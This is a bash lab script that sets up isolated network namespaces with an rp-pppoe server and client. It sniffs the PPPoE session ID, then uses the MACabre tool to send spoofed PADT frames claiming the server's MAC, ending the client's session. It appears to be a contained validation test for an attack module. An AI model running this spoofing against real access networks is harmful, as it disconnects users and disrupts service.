#!/usr/bin/env bash
# Isolated PPPoE session spoofing lab (Linux only, needs root).
#
# Topology, all in one bridge (the LAN):
#
#   server:   pppoe-server (rp-pppoe), the access concentrator, 10.10.0.1.
#   client:   pppd with the rp-pppoe plugin. It opens a PPPoE session with the server and gets ppp0.
#   attacker: MACabre's PADT sender. It claims the server's MAC and sends a PADT for the session ID.
#
# Phases:
#   Phase 1 (setup): the client opens a session. The lab records the session ID from the PADS the
#            server sends, and the ppp0 address the client gets.
#   Phase 2 (control): nothing is sent. ppp0 must stay up for CONTROL_SECONDS.
#   Phase 3 (attack): the attacker sends PADTs for the session, claiming the server's MAC. The lab
#            waits for ppp0 to disappear on the client.
#
# Exit 0 when ppp0 stays up in the control and disappears within ATTACK_WAIT seconds after the PADT,
# 1 when ppp0 stays up after the PADTs, and 2 when the session does not come up, the control drops,
# or a required tool is missing.
#
# What the lab shows: that a PADT that claims the concentrator's MAC and the session ID ends the
# client's session on this rp-pppoe stack. It does not test vendor concentrators, whether a client
# logs the PADT source, or whether a real access network filters PADT on its access ports.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/pppoe_session_spoofing_lab.sh
#
# Requirements: iproute2 (ip), rp-pppoe (pppoe-server), pppd with the rp-pppoe plugin, and the
# project virtualenv (.venv). Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 2
fi
PPPOE_SERVER="$(command -v pppoe-server 2>/dev/null || echo /usr/sbin/pppoe-server)"
if [[ ! -x "$PPPOE_SERVER" ]]; then
    echo "Missing required tool: pppoe-server (install the rp-pppoe package)" >&2
    exit 2
fi
PPPD="$(command -v pppd 2>/dev/null || echo /usr/sbin/pppd)"
if [[ ! -x "$PPPD" ]]; then
    echo "Missing required tool: pppd" >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLIENT_MAC="02:00:00:00:00:87"
ATTACKER_MAC="02:00:00:00:00:88"
CONTROL_SECONDS=10
SESSION_WAIT=40
ATTACK_WAIT=10
WORK="$(mktemp -d)"

stop_lab() {
    for ns in client attacker server; do
        for pid in $(ip netns pids "$ns" 2>/dev/null || true); do
            kill "$pid" 2>/dev/null || true
        done
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add client
ip netns add attacker

for pair in "srv:server" "cli:client" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv cli att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip link set h-srv up
ip netns exec client ip link set lo up
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up
ip netns exec attacker ip link set lo up
ip netns exec attacker ip link set h-att address "$ATTACKER_MAC"
ip netns exec attacker ip link set h-att up

SERVER_MAC="$(ip netns exec server cat /sys/class/net/h-srv/address)"

# PPP options for the server side. noauth: this lab does not test credentials.
cat > "$WORK/server-options" <<'EOF'
noauth
nodetach
nopersist
lcp-echo-interval 0
EOF

ip netns exec server "$PPPOE_SERVER" -I h-srv -L 10.10.0.1 -R 10.10.0.100 -N 1 -F \
    -O "$WORK/server-options" >"$WORK/server.log" 2>&1 &
sleep 3

# Records the session ID the server puts in the first PADS it sends to the client (argv: file, seconds).
cat > "$WORK/sniff_session.py" <<'EOF'
import sys
import threading
from scapy.all import AsyncSniffer
from scapy.layers.ppp import PPPoED

out, wait = sys.argv[1], float(sys.argv[2])
found = threading.Event()

def got(packet):
    with open(out, "w") as fh:
        fh.write(str(packet[PPPoED].sessionid))
    found.set()

sniffer = AsyncSniffer(
    iface="h-cli",
    lfilter=lambda p: p.haslayer(PPPoED) and p[PPPoED].code == 0x65,
    prn=got,
    store=False,
)
sniffer.start()
found.wait(wait)
sniffer.stop()
EOF

# Whether ppp0 in the client namespace has an IPv4 address.
ppp_up() {
    ip netns exec client ip -4 addr show ppp0 2>/dev/null | grep -q 'inet ' && echo yes || echo no
}

echo "Phase 1: setup, the client opens a PPPoE session with the server"
ip netns exec client "$PY" "$WORK/sniff_session.py" "$WORK/session-id" "$SESSION_WAIT" >/dev/null 2>&1 &
SNIFFER_PID=$!
sleep 1
ip netns exec client "$PPPD" plugin rp-pppoe.so nic-h-cli noauth nodetach nopersist noipdefault nodefaultroute \
    lcp-echo-interval 0 >"$WORK/client.log" 2>&1 &
CLIENT_PID=$!

for second in $(seq 1 "$SESSION_WAIT"); do
    if [[ "$(ppp_up)" == "yes" ]]; then
        break
    fi
    sleep 1
done
wait "$SNIFFER_PID" 2>/dev/null || true
SESSION_ID="$(cat "$WORK/session-id" 2>/dev/null || true)"
echo "  ppp0 up on the client: $(ppp_up), session ID from the PADS: ${SESSION_ID:-none}"
if [[ "$(ppp_up)" != "yes" || -z "$SESSION_ID" ]]; then
    echo "  client log (last lines):"
    tail -n 5 "$WORK/client.log" | sed 's/^/    /'
    echo "  server log (last lines):"
    tail -n 5 "$WORK/server.log" | sed 's/^/    /'
    echo "Setup: the session did not come up. Result unreliable."
    exit 2
fi
echo

echo "Phase 2: control, nothing sent for ${CONTROL_SECONDS}s"
sleep "$CONTROL_SECONDS"
CONTROL_UP="$(ppp_up)"
echo "  ppp0 still up: $CONTROL_UP"
if [[ "$CONTROL_UP" != "yes" ]]; then
    echo "Control: the session dropped without an attack. Result unreliable."
    exit 2
fi
echo

ATTACK_CODE='
import os, threading
from macabre.attacks.pppoe_session_spoofing import PppoeSessionSpoofingConfig, run_pppoe_session_spoofing
stats = run_pppoe_session_spoofing(
    PppoeSessionSpoofingConfig(
        iface="h-att",
        source_mac=os.environ["SERVER_MAC"],
        client_mac=os.environ["CLIENT_MAC"],
        session_id=int(os.environ["SESSION_ID"]),
        frames=3,
        interval=0.5,
    ),
    threading.Event(),
    lambda _s: None,
)
print(stats.frames)
'

echo "Phase 3: attack, PADTs for session $SESSION_ID from the server's MAC $SERVER_MAC to the client $CLIENT_MAC"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" SERVER_MAC="$SERVER_MAC" CLIENT_MAC="$CLIENT_MAC" \
    SESSION_ID="$SESSION_ID" "$PY" -c "$ATTACK_CODE" 2>/dev/null || echo 0)"
echo "  PADTs sent: $SENT"
ENDED_AFTER=none
for second in $(seq 1 "$ATTACK_WAIT"); do
    sleep 1
    if [[ "$(ppp_up)" != "yes" ]]; then
        ENDED_AFTER="$second"
        break
    fi
done
echo "  ppp0 gone on the client after: ${ENDED_AFTER} s (none = still up after ${ATTACK_WAIT} s)"
echo "  client log (last lines):"
tail -n 4 "$WORK/client.log" | sed 's/^/    /'
echo

kill "$CLIENT_PID" 2>/dev/null || true

if [[ "$SENT" == "3" && "$ENDED_AFTER" != "none" ]]; then
    echo "Result: after $SENT PADTs claiming the server's MAC and session $SESSION_ID, the client's ppp0 went down within ${ENDED_AFTER} s, while it stayed up in the control. The client accepted a PADT from a device that is not the concentrator. Vulnerable (rp-pppoe stack only)."
    exit 0
fi
echo "Result: ppp0 stayed up after the PADTs (sent: $SENT). Not validated."
exit 1
